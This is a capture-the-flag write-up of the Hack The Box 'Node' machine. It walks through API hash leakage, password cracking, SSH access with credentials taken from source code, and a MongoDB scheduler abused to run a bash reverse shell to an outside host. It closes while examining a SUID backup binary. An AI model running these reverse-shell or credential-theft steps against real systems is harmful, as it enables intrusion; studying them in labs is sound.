---
title: "Node - WriteUp"
date: Sat Apr 19 2025 14:15:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, reverse-shell, sudo, exploit, apache, linux, rdp, bof]
image: /assets/img/htb-writeups/Pasted image 20240131115542.png
---

{% include machine-info.html
  machine="Node"
  os="Linux"
  difficulty="Medium"
  platform="HTB"
%}

![Node](/assets/img/htb-writeups/Pasted image 20240131115542.png)

---

---
-----

![NODE](/assets/img/htb-writeups/Pasted image 20240131115542.png)

-----

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and something on TCP 3000:

```
oxdf@parrot$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.58
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-30 10:58 EDT
Nmap scan report for 10.10.10.58
Host is up (0.31s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 15.64 seconds

oxdf@parrot$ sudo nmap -p 22,3000 -sCV -oA scans/nmap-tcpscripts 10.10.10.58
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-30 10:59 EDT
Nmap scan report for 10.10.10.58
Host is up (0.075s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.94 seconds
```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu Xenial 16.04.

The TCP 3000 port is claiming to be hadoop, which is a big data storage solution. Interestingly, there’s an `http-title` field. If I re-run `nmap` with just `-sV`, it gives a different answer:

```
oxdf@parrot$ sudo nmap -p 3000 -sV 10.10.10.58
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-30 11:05 EDT
Nmap scan report for 10.10.10.58
Host is up (0.062s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.75 seconds
```

I have no idea why adding `-sC` to run safe scripts against port 3000 would change the version reported from Express to Hadoop. But it’s a good reminder that when something looks unexpected, poke at it a bit more.

### Website - TCP 3000

#### Site

The site looks like a social media site:

[![image-20210530111011148](https://0xdfimages.gitlab.io/img/image-20210530111011148.png)](https://0xdfimages.gitlab.io/img/image-20210530111011148.png)

[_Click for full image_](https://0xdfimages.gitlab.io/img/image-20210530111011148.png)

It says that signups are currently closed. When I click on the three users, the profiles (at `http://10.10.10.58:3000/profiles/[username]`) aren’t very interesting (all three are the same other than image and name):

![image-20210530111129647](https://0xdfimages.gitlab.io/img/image-20210530111129647.png)

The login page has a simple form:

![image-20210530111223243](https://0xdfimages.gitlab.io/img/image-20210530111223243.png)

I tried some basic usernames/passwords, and some basic SQL injections, but to no avail. Because it’s using NodeJS, there’s a good chance the backend is using MongoDB. I tried some basic noSQL injections (`[$ne]=1`, `{$gt: ''}`, etc), but none returned anything interesting.

#### Directory Brute Force

I’ll run `feroxbuster` against the site with no extensions:

```
oxdf@parrot$ feroxbuster -u http://10.10.10.58:3000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.58:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
WLD       90l      249w     3861c Got 200 for http://10.10.10.58:3000/1e8dd710ea4c44388cde82495eac4ee4 (url length: 32)
WLD         -         -         - Wildcard response is static; auto-filtering 3861 responses; toggle this behavior by using --dont-filter
WLD       90l      249w     3861c Got 200 for http://10.10.10.58:3000/3fd8fc5723f14460b8c42cfe73869e2bf5e724907acf4154b32fddf0a3fb5ec69b0ba88e1531424cb93da1da907a9607 (url length: 96)
301        9l       15w      171c http://10.10.10.58:3000/assets
301        9l       15w      175c http://10.10.10.58:3000/partials
301        9l       15w      173c http://10.10.10.58:3000/uploads
301        9l       15w      179c http://10.10.10.58:3000/assets/css
301        9l       15w      171c http://10.10.10.58:3000/vendor
301        9l       15w      177c http://10.10.10.58:3000/assets/js
301        9l       15w      187c http://10.10.10.58:3000/assets/js/misc
301        9l       15w      185c http://10.10.10.58:3000/assets/js/app
301        9l       15w      185c http://10.10.10.58:3000/vendor/jquery
301        9l       15w      209c http://10.10.10.58:3000/assets/js/app/controllers
[####################] - 3m    299990/299990  0s      found:12      errors:8      
[####################] - 1m     30001/29999   313/s   http://10.10.10.58:3000
[####################] - 1m     29999/29999   264/s   http://10.10.10.58:3000/assets
[####################] - 1m     29999/29999   259/s   http://10.10.10.58:3000/partials
[####################] - 2m     29999/29999   229/s   http://10.10.10.58:3000/uploads
[####################] - 2m     29999/29999   229/s   http://10.10.10.58:3000/assets/css
[####################] - 2m     29999/29999   228/s   http://10.10.10.58:3000/vendor
[####################] - 2m     29999/29999   238/s   http://10.10.10.58:3000/assets/js
[####################] - 1m     29999/29999   309/s   http://10.10.10.58:3000/assets/js/misc
[####################] - 1m     29999/29999   373/s   http://10.10.10.58:3000/assets/js/app
[####################] - 1m     29999/29999   406/s   http://10.10.10.58:3000/vendor/jquery
```

None of these were particularly interesting. `/uploads` redirects back to `/`.

#### Tech Stack

Looking at the HTTP response, it confirms the server is running Express:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Sat, 02 Sep 2017 11:27:58 GMT
ETag: W/"f15-15e4258ef70"
Content-Type: text/html; charset=UTF-8
Content-Length: 3861
Date: Sun, 30 May 2021 15:51:02 GMT
Connection: close
```

[Express](https://expressjs.com/) is a NodeJS-based JavaScript framework for serving websites. The benefits of using JavaScript on the server is that it allows simplified interactions between the client-side JavaScript and the server-side JavaScript.

In the Firefox dev tools, I can see the different JS files running on the client:

![image-20210605141455184](https://0xdfimages.gitlab.io/img/image-20210605141455184.png)

`app.js` defines the different routes for site, each with a different controller. The controllers are in the `/controllers` folder, and each have references to different calls to paths server-side starting with `/api`. The two endpoints in `admin.js` are `/api/admin/backup` and `/api/session`:

```
var controllers = angular.module('controllers');

controllers.controller('AdminCtrl', function ($scope, $http, $location, $window) {
  $scope.backup = function () {
    $window.open('/api/admin/backup', '_self');
  }

  $http.get('/api/session')
    .then(function (res) {
      if (res.data.authenticated) {
        $scope.user = res.data.user;
      }
      else {
        $location.path('/login');
      }
    });
});
```

Both of those endpoints return `{"authenticated":false}` if I try to query them directly. `home.js` referenced `/api/users/latest` (likely getting the users to display in the latest users section). If I check that out with `curl`, it returns an array of users, each with `_id`, `username`, `password`, and `is_admin` fields:

```
oxdf@parrot$ curl -s 10.10.10.58:3000/api/users/latest | jq .
[
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

In `profile.js`, there’s a call to `/api/users/' + $routeParams.username`. I can try that, and with known users is returns the same data, and with a non-existent user it returns not found:

```
oxdf@parrot$ curl -s 10.10.10.58:3000/api/users/mark | jq .
{
  "_id": "59a7368e98aa325cc03ee51e",
  "username": "mark",
  "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
  "is_admin": false
}
oxdf@parrot$ curl -s 10.10.10.58:3000/api/users/0xdf | jq .
{
  "not_found": true
}
```

None of the admin usernames I guessed were found, but eventually I checked `/api/users/`. It returns the same three users, plus one more, myP14ceAdm1nAcc0uNT:

```
oxdf@parrot$ curl -s 10.10.10.58:3000/api/users/ | jq .
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

### Crack Hashes

I’ll use `jq` to get just the password hashes:

```
oxdf@parrot$ curl -s 10.10.10.58:3000/api/users/ | jq -r '.[].password'
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
```

For unsalted hashes with a standard wordlist, it’s just easier to check online sites first rather than cracking myself. I’ll drop the hashes into [CrackStation](https://crackstation.net/), and three of the four break:

[![image-20210530123743340](https://0xdfimages.gitlab.io/img/image-20210530123743340.png)_Click for full size image_](https://0xdfimages.gitlab.io/img/image-20210530123743340.png)

The one I’m most interested in, the admin account, breaks with the password manchester.

## Shell as mark

### myplace.backup

#### Get File

I can use the creds recovered from the leaky API to login as myP14ceAdm1nAcc0uNT. It just presents a single download link:

![image-20210531091419011](https://0xdfimages.gitlab.io/img/image-20210531091419011.png)

The file is a single long line of ASCII text:

```
oxdf@parrot$ file myplace.backup 
myplace.backup: ASCII text, with very long lines, with no line terminators
oxdf@parrot$ wc myplace.backup 
      0       1 3459880 myplace.backup
```

`od` can give me a list of the unique characters in the file:

```
oxdf@parrot$ cat myplace.backup | od -cvAnone -w1 | sort -bu | tr -d '\n' | tr -d ' '
+/=0123456789aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ
```

The character set matches the base64 character set. On decoding it, there’s a Zip Archive:

```
oxdf@parrot$ cat myplace.backup | base64 -d > myplace.backup.decode
oxdf@parrot$ file myplace.backup.decode
myplace.backup.decode: Zip archive data, at least v1.0 to extract
oxdf@parrot$ mv myplace.backup.decode myplace.backup.zip
```

#### Crack Password

The archive (now renamed to `.zip`) looks to have the source for the website:

```
oxdf@parrot$ unzip -l myplace.backup.zip
Archive:  myplace.backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2017-09-03 08:59   var/www/myplace/
    21264  2017-09-01 19:10   var/www/myplace/package-lock.json
        0  2017-09-01 19:10   var/www/myplace/node_modules/
        0  2017-09-01 19:10   var/www/myplace/node_modules/serve-static/
     7508  2017-02-24 21:17   var/www/myplace/node_modules/serve-static/README.md
     4533  2017-02-25 18:11   var/www/myplace/node_modules/serve-static/index.js
     1189  2017-02-24 21:01   var/www/myplace/node_modules/serve-static/LICENSE
...[snip]...
```

Trying to unzip the archive (now renamed to `.zip`) requires a password:

```
oxdf@parrot$ unzip myplace.backup.zip
Archive:  myplace.backup.zip
[myplace.backup.zip] var/www/myplace/package-lock.json password:
```

`zip2john` will get a hash from the zip:

```
oxdf@parrot$ zip2john myplace.backup.zip 2>/dev/null | tee myplace.backup.zip.hash 
myplace.backup.zip:$pkzip2$3*2*1*0*8*24*9c88*1223*136156550967246d64dbbc4042b6071e555cca59f137820d78028f34c27ef656f4ff9253*1*0*8*24*37ef*0145*17c1c824dc8353410e42191981847f7c1c7590571999d78ebf4d598c9fd8d575279966c8*2*0*11*5*118f1dfc*94cb*67*0*11*118f*3d0f*f6c78954956eb3d954ee7f4729b1b6ebe2*$/pkzip2$::myplace.backup.zip:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/serve-static/README.md, var/www/myplace/package-lock.json:myplace.backup.zip
```

`john` will break this very quickly:

```
oxdf@parrot$ john myplace.backup.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (myplace.backup.zip)
1g 0:00:00:00 DONE (2021-05-31 09:36) 4.347g/s 795269p/s 795269c/s 795269C/s majid..madeli
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now I can unzip the archive.

#### Enumeration

The files unzip to what looks like the source for the myplace application. In `app.js`, there’s a database connection string with credentials for mark:

```
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

### SSH

That password for mark works over SSH:

```
oxdf@parrot$ sshpass -p '5AYRft73VtFpc84k' ssh mark@10.10.10.58                                                                                            
The programs included with the Ubuntu system are free software;             
the exact distribution terms for each program are described in the          
individual files in /usr/share/doc/*/copyright.                             
                                                                                            
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.   

              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-`                                                                           
...[snip]...

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ 
```

Unfortunately, no flag yet:

```
mark@node:~$ ls -la
total 24
drwxr-xr-x 3 root root 4096 Sep  3  2017 .
drwxr-xr-x 5 root root 4096 Aug 31  2017 ..
-rw-r--r-- 1 root root  220 Aug 31  2017 .bash_logout
-rw-r--r-- 1 root root 3771 Aug 31  2017 .bashrc
drwx------ 2 root root 4096 Aug 31  2017 .cache
-rw-r----- 1 root root    0 Sep  3  2017 .dbshell
-rwxr-xr-x 1 root root    0 Sep  3  2017 .mongorc.js
-rw-r--r-- 1 root root  655 Aug 31  2017 .profile
```

## Shell as tom

### Enumeration

There are two other users with home directories on the box:

```
mark@node:/home$ ls
frank  mark  tom
```

`user.txt` is in tom’s directory but mark can’t read it:

```
mark@node:/home$ ls -l tom/
total 4
-rw-r----- 1 root tom 33 Sep  3  2017 user.txt
```

There are two processes running as tom:

```
mark@node:/home$ ps auxww
...[snip]...
tom       1217  0.2  5.3 1019880 40700 ?       Ssl  02:39   0:00 /usr/bin/node /var/www/myplace/app.js
tom       1223  0.3  5.2 1007544 40060 ?       Ssl  02:39   0:01 /usr/bin/node /var/scheduler/app.js
...[snip]...
```

`/var/www/myplace/app.js` is the webapp I already interfaced with, so I’ll turn to `/var/scheduler/app.js`:

```
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

This script will connect to the Mongo database, and then run a series of commands every 30 seconds. It will get items out of the `tasks` collection. For each doc, it will pass `doc.cmd` to `exec` to run it, and then delete the doc.

### Execution

#### Connect

I’ll connect to the DB using the Mongo client specifying the user, password, and database to connect to:

```
mark@node:/$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> 
```

In Mongo, a database (like `scheduler`) has collections (kind of like tables in SQL). This db has one collection:

```
> show collections
tasks
```

The collection has no objects in it:

```
> db.tasks.find()
```

#### POC

I’ll test execution by adding a command to `touch` a file in `/tmp`:

```
> db.tasks.insert({"cmd": "touch /tmp/0xdf"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("60b6e551e6bccdfbc52f13ca"), "cmd" : "touch /tmp/0xdf" }
```

30 seconds later, the object is gone:

```
> db.tasks.find()
```

In `/tmp`, a new file is there owned by tom:

```
mark@node:/tmp$ ls -l 0xdf 
-rw-r--r-- 1 tom tom 0 Jun  2 02:56 0xdf
```

#### Shell

Now I’ll insert a reverse shell into the DB as the command:

```
> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("60b6e61ee6bccdfbc52f13cb"), "cmd" : "bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'" }
```

30 seconds later, there’s a connection at `nc`:

```
oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.58] 47666
bash: cannot set terminal process group (1223): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:/$
```

I’ll upgrade the shell with the standard trick:

```
tom@node:/$ python3 -c 'import pty;pty.spawn("bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg 
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
                                                                         
tom@node:/$ 
```

And now I can access `user.txt`:

```
tom@node:~$ cat user.txt
e1156acc************************
```

## Shell as root

### Enumeration

When gaining access to a second user in a CTF machine, it’s always useful to think about what files can be accesses/run now that couldn’t before. One way to approach that is to look at the groups associated with the new user:

```
tom@node:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

`sudo` is the first to jump out, but trying to run `sudo` prompts for tom’s password, which I don’t have:

```
tom@node:~$ sudo su -
[sudo] password for tom:
```

`adm` means that I can access all the logs, and that’s worth checking out, but `admin` is more interesting. It’s group id (gid) is above 1000, which means it’s a group created by an admin instead of by the OS, which means it’s custom. Looking for files with this group, there’s only one:

```
tom@node:~$ find / -group admin -ls 2>/dev/null 
   303364     20 -rwsr-xr--   1 root     admin       16484 Sep  3  2017 /usr/local/bin/backup
```

It’s also a SUID binary owned by root, which means it runs as root.

Interestingly, this binary is called from `/var/www/myplace/app.js`:

```
  app.get('/api/admin/backup', function (req, res) {                                                     
    if (req.session.user && req.session.user.is_admin) {                                                 
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);                         
      var backup = '';                                                                                   
                                                    
      proc.on("exit", function(exitCode) {                                                               
        res.header("Content-Type", "text/plain");                                                        
        res.header("Content-Disposition", "attachment; filename=myplace.backup");                        
        res.send(backup);                                                                                
      });                                                                                                
                                                                                                         
      proc.stdout.on("data", function(chunk) {                                                           
        backup += chunk;                            
      });        
                                                    
      proc.stdout.on("end", function() {          
      });
    }                                               
    else {                                   
      res.send({                                                                                         
        authenticated: false                        
      });                              
    }                          
  });   
```

It calls `backup -q backup_key __dirname`, where `__dirname` is the current directory.

The binary is a 32-bit ELF:

```
tom@node:/$ file /usr/local/bin/backup 
/usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
```

### Dynamic Analysis

#### Number of Args

Before pulling this binary back and opening in in Ghidra, I’ll try running it on Node. It returns without any output:

```
tom@node:~$ backup
```

I tried giving it arguments to see if there was a check at the front looking for a certain number, and on three, it output something:

```
tom@node:~$ backup a
tom@node:~$ backup a a
tom@node:~$ backup a a a

             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'

 [!] Ah-ah-ah! You didn't say the magic word!
```

This makes sense with how this binary is called from `app.js` above. It’s complaining about needing a magic word.

#### Token Check

I’ll run that again with `ltrace`, and change the three args so that they are different (to better track which is which), so `ltrace a b c`. I’ll walk through the output in chunks. First it checks the effective user id, and then sets the uid to 0, root. Then it does a string comparison between “a” (first arg input) and “-q”:

```
__libc_start_main(0x80489fd, 4, 0xffc15284, 0x80492c0 <unfinished ...>
geteuid()                                          = 1000
setuid(1000)                                       = 0
strcmp("a", "-q")                                  = 1
```

In this case that comparison returns 1 (no match). If I do pass in `-q` as the first arg, it just prints nothing. Maybe this is some kind of quiet mode? That was what was passed in the call from the webserver. After that, it prints the computer ascii art with a bunch of `puts` calls.

Next the binary uses `strcat` to build the string `/etc/myplace/keys` and opens that file:

```
strncpy(0xff93c108, "b", 100)                       = 0xff93c108
strcpy(0xff93c0f1, "/")                             = 0xff93c0f1
strcpy(0xff93c0fd, "/")                             = 0xff93c0fd
strcpy(0xff93c087, "/e")                            = 0xff93c087
strcat("/e", "tc")                                  = "/etc"
strcat("/etc", "/m")                                = "/etc/m"
strcat("/etc/m", "yp")                              = "/etc/myp"
strcat("/etc/myp", "la")                            = "/etc/mypla"
strcat("/etc/mypla", "ce")                          = "/etc/myplace"
strcat("/etc/myplace", "/k")                        = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey")                      = "/etc/myplace/key"
strcat("/etc/myplace/key", "s")                     = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r")                     = 0x9891410
```

The result of the `fopen` is 0x9891410, which represents a `FILE` object.

Next there’s a series of `fgets`, `strcspn`, and `strcmp` calls:

```
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x9891410) = 0xff93bc9f
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n")          = 64
strcmp("b", "a01a6aa5aaf1d7729f35c8278daae30f"...)            = 1
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x9891410) = 0xff93bc9f
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n")          = 64
strcmp("b", "45fac180e9eee72f4fd2d9386ea7033e"...)            = 1
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x9891410) = 0xff93bc9f
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n")          = 64
strcmp("b", "3de811f4ab2b7543eaf45df611c2dd25"...)            = 1
fgets("\n", 1000, 0x9891410)                                  = 0xff93bc9f
strcspn("\n", "\n")                                           = 0
strcmp("b", "")                                               = 1
fgets(nil, 1000, 0x9891410)                                   = 0
```

`strcspn` with the second argument of `\n` gets the length of the line. Then there are `strcmp` calls with “b”, the second argument. This looks like a loop reading lines from the file, comparing them to the second arg. None of them match.

Then it copies the “you didn’t say the magic word” string, prints it, and exits:

```
strcpy(0xff93acd8, "Ah-ah-ah! You didn't say the mag"...)    = 0xff93acd8
printf(" %s[!]%s %s\n", "\033[33m", "\033[37m", "Ah-ah-ah! You didn't say the mag"... [!] Ah-ah-ah! You didn't say the magic word!)        = 58
exit(1 <no return ...>
+++ exited (status 1) +++
```

`/etc/myplace/keys` shows the three 64-characters hashes and a blank line just as observed with `ltrace`:

```
tom@node:~$ cat /etc/myplace/keys 
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110

```

If I put one of those hashes into the second argument, it runs past the access token check:

```
tom@node:~$ backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 c       
...[snip]...
 [+] Validated access token
 [+] Starting archiving c
 [!] The target path doesn't exist
```

Interestingly, it will also work with an empty string as the token arg (because there’s an empty line in the keys file):

```
tom@node:~$ backup a '' c       
...[snip]...
 [+] Validated access token
 [+] Starting archiving c
 [!] The target path doesn't exist
```

#### Path

With a valid token, it says it’s “archiving c”, and then complains that the path doesn’t exist. I’ll try replacing “c” with a path. I’ll create a single file in `/dev/shm`, and then pass that path to `backup`:

```
tom@node:/dev/shm$ echo "test" > 0xdf
tom@node:/dev/shm$ backup a "" /dev/shm/ 
...[snip]...
 [+] Validated access token
 [+] Starting archiving /dev/shm/
 [+] Finished! Encoded backup is below:

UEsDBAoAAAAAAIdrwlIAAAAAAAAAAAAAAAAIABwAZGV2L3NobS9VVAkAA115t2BmebdgdXgLAAEEAAAAAAQAAAAAUEsDBAoACQAAAIdrwlLGNbk7EQAAAAUAAAAMABwAZGV2L3NobS8weGRmVVQJAANdebdgXXm3YHV4CwABBOgDAAAE6AMAAKthCSm7xvCUdmu+TjFfLB/YUEsHCMY1uTsRAAAABQAAAFBLAQIeAwoAAAAAAIdrwlIAAAAAAAAAAAAAAAAIABgAAAAAAAAAEAD/QwAAAABkZXYvc2htL1VUBQADXXm3YHV4CwABBAAAAAAEAAAAAFBLAQIeAwoACQAAAIdrwlLGNbk7EQAAAAUAAAAMABgAAAAAAAEAAACkgUIAAABkZXYvc2htLzB4ZGZVVAUAA115t2B1eAsAAQToAwAABOgDAABQSwUGAAAAAAIAAgCgAAAAqQAAAAAA
```

If I change “a” to “-q”, it will just print the base64:

```
tom@node:/dev/shm$ backup -q "" /dev/shm/                                    
UEsDBAoAAAAAAIdrwlIAAAAAAAAAAAAAAAAIABwAZGV2L3NobS9VVAkAA115t2CxebdgdXgLAAEEAAAAAAQAAAAAUEsDBAoACQAAAIdrwlLGNbk7EQAAAAUAAAAMABwAZGV2L3NobS8weGRmVVQJAANdebdgZnm3YHV4CwABBOgDAAAE6AMAAAmZTkjtLiJEG316SakUwU5JUEsHCMY1uTsRAAAABQAAAFBLAQIeAwoAAAAAAIdrwlIAAAAAAAAAAAAAAAAIABgAAAAAAAAAEAD/QwAAAABkZXYvc2htL1VUBQADXXm3YHV4CwABBAAAAAAEAAAAAFBLAQIeAwoACQAAAIdrwlLGNbk7EQAAAAUAAAAMABgAAAAAAAEAAACkgUIAAABkZXYvc2htLzB4ZGZVVAUAA115t2B1eAsAAQToAwAABOgDAABQSwUGAAAAAAIAAgCgAAAAqQAAAAAA
```

Just like before, the base64 decodes to a zip file, which contains the directory:

```
tom@node:/dev/shm$ backup -q "" /dev/shm/ | base64 -d > test.zip
tom@node:/dev/shm$ unzip -l test.zip 
Archive:  test.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2021-06-02 13:30   dev/shm/
        0  2021-06-02 13:30   dev/shm/test.zip
        5  2021-06-02 13:28   dev/shm/0xdf
---------                     -------
        5                     3 files
```

It unzips with the same password as before (“magicword”):

```
tom@node:/dev/shm$ unzip test.zip    
Archive:  test.zip
   creating: dev/shm/
[test.zip] dev/shm/test.zip password: 
 extracting: dev/shm/test.zip        
 extracting: dev/shm/0xdf            
tom@node:/dev/shm$ cat dev/shm/0xdf 
test
```

